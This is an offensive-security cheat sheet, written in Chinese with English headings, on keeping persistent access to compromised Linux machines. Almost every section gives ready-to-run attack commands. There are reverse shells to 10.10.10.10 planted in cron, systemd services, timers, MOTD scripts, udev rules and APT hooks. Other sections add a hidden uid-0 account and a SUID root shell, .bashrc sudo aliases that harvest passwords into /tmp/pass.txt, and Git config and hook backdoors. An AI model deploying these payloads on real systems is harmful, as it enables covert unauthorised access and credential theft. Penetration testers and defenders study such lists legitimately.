# Linux - 持久化 (Persistence)

## 目录 (Summary)

* [基础反弹 Shell (Basic Reverse Shell)](#basic-reverse-shell)
* [添加 Root 用户 (Add a Root User)](#add-a-root-user)
* [SUID 二进制文件 (SUID Binary)](#suid-binary)
* [Crontab](#crontab)
* [Bash 配置文件 (Bash Configuration File)](#bash-configuration-file)
* [启动服务 (Startup Service)](#startup-service)
* [Systemd 用户服务 (Systemd User Service)](#systemd-user-service)
* [Systemd 定时器文件 (Systemd Timer File)](#systemd-timer-file)
* [每日消息 (Message of the Day)](#message-of-the-day)
* [用户启动文件 (User Startup File)](#user-startup-file)
* [Udev 规则 (Udev Rule)](#udev-rule)
* [APT 配置 (APT Configuration)](#apt-configuration)
* [SSH 配置 (SSH Configuration)](#ssh-configuration)
* [Git 配置 (Git Configuration)](#git-configuration)
    * [Git 配置变量 (Git Configuration Variables)](#git-configuration-variables)
    * [Git 钩子 (Git Hooks)](#git-hooks)
* [其他 Linux 持久化选项 (Additional Linux Persistence Options)](#additional-persistence-options)
* [参考资料 (References)](#references)

## 基础反弹 Shell (Basic Reverse Shell)

```bash
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

## 添加 Root 用户 (Add a Root User)

```powershell
sudo useradd -ou 0 -g 0 john
sudo passwd john
echo "linuxpassword" | passwd --stdin john
```

## SUID 二进制文件 (SUID Binary)

```powershell
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

## Crontab

Crontab（cron table 的缩写）是 Unix 类系统中用于调度任务（cron jobs）的配置文件。它允许用户在特定时间或间隔自动执行重复命令。

一条 crontab 条目的格式如下：

```ps1
* * * * * 要执行的命令
| | | | |
| | | | └── 星期 (0-7, 星期日 = 0 或 7)
| | | └──── 月份 (1-12)
| | └────── 每月第几天 (1-31)
| └──────── 小时 (0-23)
└────────── 分钟 (0-59)
```

每次系统重启时运行脚本：

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 10.10.10.10 4242 -e /bin/bash")|crontab 2> /dev/null
```

## Bash 配置文件 (Bash Configuration File)

`~/.bashrc` 文件是针对 Bash (Bourne Again Shell) 的特定用户配置文件。每当打开一个新的交互式非登录 shell（例如打开终端）时，它都会自动运行。

在 `.bashrc` 中设置后门的示例，当用户使用 `sudo` 命令时触发反弹 shell：

```bash
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
cat << EOF > /tmp/$TMPNAME2
  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
EOF
if [ -f ~/.bashrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.zshrc
fi
rm /tmp/$TMPNAME2
```

在用户的 `.bashrc` 文件中添加以下行，以劫持 sudo 命令并将输入内容写入 `/tmp/pass`。

```powershell
chmod u+x ~/.hidden/fakesudo
echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

最后，创建 `fakesudo` 脚本：

```powershell
read -sp "[sudo] password for $USER: " sudopass
echo ""
sleep 2
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```

## 启动服务 (Startup Service)

编辑 `/etc/network/if-up.d/upstart` 文件：

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

## Systemd 用户服务 (Systemd User Service)

在 `~/.config/systemd/user/` 中创建一个服务文件。

```ps1
vim ~/.config/systemd/user/persistence.service
```

添加以下配置：

```ps1
[Unit]
Description=Reverse shell

[Service]
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
```

启用并启动服务：

```ps1
systemctl --user enable persistence.service
systemctl --user start persistence.service
```

## Systemd 定时器文件 (Systemd Timer File)

Systemd 定时器是一种使用 Systemd 而非 `cron` 来调度任务（如 cron jobs）的方法。它与相应的服务文件一起工作，在特定的间隔或时间执行命令。

创建定时器文件：`/etc/systemd/system/backdoor.timer`

```ini
[Unit]
Description=Backdoor Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
```

创建一个对应的服务单元文件：`/etc/systemd/system/backdoor.service`

```ini
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash /opt/backdoor/backdoor.sh
```

启用并启动定时器：

```ps1
sudo systemctl enable shout.timer
sudo systemctl start shout.timer
```

## 每日消息 (Message of the Day)

编辑 `/etc/update-motd.d/00-header` 文件：

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/update-motd.d/00-header
```

## 用户启动文件 (User Startup File)

`~/.config/autostart/` 目录用于 Linux 桌面环境（如 GNOME、KDE、XFCE），在用户登录时自动启动应用程序。

每个启动程序都使用放置在该目录中的 .desktop 文件定义。

```powershell
[Desktop Entry]
Type=Application
Name=Custom Script
Exec=/home/user/scripts/startup.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
```

## Udev 规则 (Udev Rule)

Udev 是 Linux 内核的设备管理器，负责动态处理设备事件。每当插入特定设备时执行脚本，即可利用它实现持久化。

```bash
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

保存规则文件后，重新加载 udev 规则：

```ps1
sudo udevadm control --reload-rules
sudo udevadm trigger
```

## APT 配置 (APT Configuration)

如果你可以在 `apt.conf.d` 目录下创建一个包含以下内容的文件：

```ps1
APT::Update::Pre-Invoke {"CMD"};
```

下次执行 "`apt-get update`" 时，你的 CMD 就会被执行！

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

## SSH 配置 (SSH Configuration)

将 SSH 密钥添加到 `~/.ssh` 文件夹中。

`~/.ssh/authorized_keys` 是 SSH 用于存储允许登录用户账户的公钥的标准文件。历史上，`authorized_keys` 处理 SSH 协议版本 1 的密钥，而 `authorized_keys2` 处理 SSH 协议版本 2 的密钥。

1. 使用 `ssh-keygen` 生成新密钥
2. 将 `~/.ssh/id_rsa.pub` 的内容写入 `~/.ssh/authorized_keys` 或 `~/.ssh/authorized_keys2`
3. 设置正确的权限

| 路径/文件                 | 推荐权限 | 描述                                      |
|---------------------------|----------|-------------------------------------------|
| `~/.ssh/`                 | `700`    | 只有用户可以读取/写入/执行该文件夹        |
| `~/.ssh/authorized_keys`  | `600`    | 只有用户可以读取/写入该文件               |
| `~/.ssh/authorized_keys2` | `600`    | 同上；遗留/弃用的文件                     |

## Git 配置 (Git Configuration)

通过 Git 设置后门是获得持久化且无需 root 权限的一种有用方式。
必须特别注意确保后门命令没有输出，否则持久化非常容易被发现。

### Git 配置变量 (Git Configuration Variables)

有多个 [Git 配置变量](https://git-scm.com/docs/git-config)在执行某些操作时会执行任意命令。
作为额外的奖励，可以通过多种方式指定 Git 配置，从而提供额外的后门机会。
可以在用户级别 (`~/.gitconfig`)、仓库级别 (`path/to/repo/.git/config`) 设置配置，有时也可以通过环境变量设置。

`core.editor` 在 Git 需要为用户提供编辑器时执行（例如 `git rebase -i`, `git commit --amend`）。
等效的环境变量是 `GIT_EDITOR`。

```properties
[core]
editor = nohup BACKDOOR >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-emacs}}
```

`core.pager` 在 Git 需要显示可能大量的数据时执行（例如 `git diff`, `git log`, `git show`）。
等效的环境变量是 `GIT_PAGER`。

```properties
[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}
```

`core.sshCommand` 在 Git 需要与远程 *ssh* 仓库交互时执行（例如 `git fetch`, `git pull`, `git push`）。
等效的环境变量是 `GIT_SSH` 或 `GIT_SSH_COMMAND`。

```properties
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```

请注意，从技术上讲，`ssh.variant` (`GIT_SSH_VARIANT`) 是可选的，但如果没有它，Git 会快速连续运行 `sshCommand` *两次*。（第一次运行是为了确定 SSH 变体，第二次运行是为了向其传递正确的参数。）

### Git 钩子 (Git Hooks)

[Git 钩子 (Git hooks)](https://git-scm.com/docs/githooks) 是你可以放置在 hooks 目录中的程序，用于在 Git 执行过程中的特定时刻触发操作。

默认情况下，钩子存储在仓库的 `.git/hooks` 目录中，当其名称与当前的 Git 操作匹配且钩子标记为可执行（即 `chmod +x`）时运行。
可能用于设置后门的钩子脚本：

* `pre-commit`：在 `git commit` 执行前运行。
* `pre-push`：在 `git push` 执行前运行。
* `post-checkout`：在 `git checkout` 执行后运行。
* `post-merge`：在 `git merge` 之后或 `git pull` 应用新更改后运行。

除了生成后门外，上述某些钩子还可以用于在用户未察觉的情况下向仓库中潜伏恶意更改。

最后，通过在用户级 Git 配置文件 (`~/.gitconfig`) 中将 `core.hooksPath` 变量设置为公共目录，可以全局化地为用户*所有*的 Git 钩子设置后门。请注意，此方法将破坏任何现有的仓库专用 Git 钩子。

## 其他持久化选项 (Additional Persistence Options)

* [SSH 授权密钥 (SSH Authorized Keys)](https://attack.mitre.org/techniques/T1098/004)
* [破坏客户端软件二进制文件 (Compromise Client Software Binary)](https://attack.mitre.org/techniques/T1554)
* [创建账户 (Create Account)](https://attack.mitre.org/techniques/T1136/)
* [创建账户：本地账户 (Create Account: Local Account)](https://attack.mitre.org/techniques/T1136/001/)
* [创建或修改系统进程 (Create or Modify System Process)](https://attack.mitre.org/techniques/T1543/)
* [创建或修改系统进程：Systemd 服务 (Create or Modify System Process: Systemd Service)](https://attack.mitre.org/techniques/T1543/002/)
* [事件触发执行：Trap (Event Triggered Execution: Trap)](https://attack.mitre.org/techniques/T1546/005/)
* [事件触发执行 (Event Triggered Execution)](https://attack.mitre.org/techniques/T1546/)
* [事件触发执行：.bash_profile 和 .bashrc](https://attack.mitre.org/techniques/T1546/004/)
* [外部远程服务 (External Remote Services)](https://attack.mitre.org/techniques/T1133/)
* [劫持执行流 (Hijack Execution Flow)](https://attack.mitre.org/techniques/T1574/)
* [劫持执行流：LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
* [操作系统启动前 (Pre-OS Boot)](https://attack.mitre.org/techniques/T1542/)
* [操作系统启动前：引导启动程序 (Bootkit)](https://attack.mitre.org/techniques/T1542/003/)
* [计划任务/作业 (Scheduled Task/Job)](https://attack.mitre.org/techniques/T1053/)
* [计划任务/作业：At (Linux)](https://attack.mitre.org/techniques/T1053/001/)
* [计划任务/作业：Cron](https://attack.mitre.org/techniques/T1053/003/)
* [服务器软件组件 (Server Software Component)](https://attack.mitre.org/techniques/T1505/)
* [服务器软件组件：SQL 存储过程](https://attack.mitre.org/techniques/T1505/001/)
* [服务器软件组件：传输代理 (Transport Agent)](https://attack.mitre.org/techniques/T1505/002/)
* [服务器软件组件：Web Shell](https://attack.mitre.org/techniques/T1505/003/)
* [流量信号触发 (Traffic Signaling)](https://attack.mitre.org/techniques/T1205/)
* [流量信号触发：端口敲门 (Port Knocking)](https://attack.mitre.org/techniques/T1205/001/)
* [有效账户：默认账户 (Valid Accounts: Default Accounts)](https://attack.mitre.org/techniques/T1078/001/)
* [有效账户：域账户 (Valid Accounts: Domain Accounts)](https://attack.mitre.org/techniques/T1078/002/)

## 参考资料 (References)

* [apt.conf.d backdoor - RandoriSec - September 3, 2018](https://twitter.com/RandoriSec/status/1036622487990284289)
* [g0t r00t? pwning a machine - muelli - June 25, 2009](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [Modern Linux Rootkits 101 - Tyler Borland (TurboBorland) - September 20, 2013](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [[Hacking-Contest] Rootkit - Jakob Lell - May 7, 2014](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
